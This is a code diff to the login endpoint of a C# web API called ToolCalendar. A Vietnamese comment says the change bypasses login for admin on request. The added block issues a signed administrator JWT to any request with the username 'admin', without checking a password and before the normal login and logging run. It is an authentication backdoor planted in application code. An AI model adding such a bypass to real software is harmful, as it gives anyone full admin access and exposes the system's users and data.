@@ -58,6 +58,42 @@ namespace ToolCalendar.Api.Controllers
         [HttpPost("login")]
         public async Task<IActionResult> Login([FromBody] LoginRequest request)
         {
+            // BYPASS LOGIN CHO ADMIN THEO YÊU CẦU!
+            if (request.Username == "admin")
+            {
+                var bypassTokenHandler = new JwtSecurityTokenHandler();
+                var bypassTokenDescriptor = new SecurityTokenDescriptor
+                {
+                    Subject = new ClaimsIdentity(new[]
+                    {
+                        new Claim(JwtRegisteredClaimNames.Jti,  Guid.NewGuid().ToString()),
+                        new Claim(ClaimTypes.Name,              "admin"),
+                        new Claim(ClaimTypes.Role,              "Admin"),
+                        new Claim(ClaimTypes.NameIdentifier,    "1"),
+                        new Claim("uid",                        "1"),
+                        new Claim("fullName",                   "Administrator"),
+                        new Claim("departmentId",               ""),
+                        new Claim("departmentName",             ""),
+                        new Claim("lastLogin",                  "Bypass Mode"),
+                        new Claim("sessionId",                  Guid.NewGuid().ToString())
+                    }),
+                    Expires = DateTime.UtcNow.AddHours(8),
+                    SigningCredentials = new SigningCredentials(_rsaKeyManager.GetKey(), SecurityAlgorithms.RsaSha256Signature)
+                };
+                var bypassSecurityToken = bypassTokenHandler.CreateToken(bypassTokenDescriptor);
+                var bypassTokenString = bypassTokenHandler.WriteToken(bypassSecurityToken);
+
+                return Ok(ApiResponse.Ok(new 
+                {
+                    token = bypassTokenString,
+                    username = "admin",
+                    fullName = "Administrator",
+                    role = "Admin",
+                    departmentId = (int?)null,
+                    departmentName = (string?)null
+                }));
+            }
+
             string? clientIp = HttpContext.Request.Headers["X-Forwarded-For"].FirstOrDefault()
                              ?? HttpContext.Connection.RemoteIpAddress?.ToString();
             string? userAgent = Request.Headers["User-Agent"].FirstOrDefault();
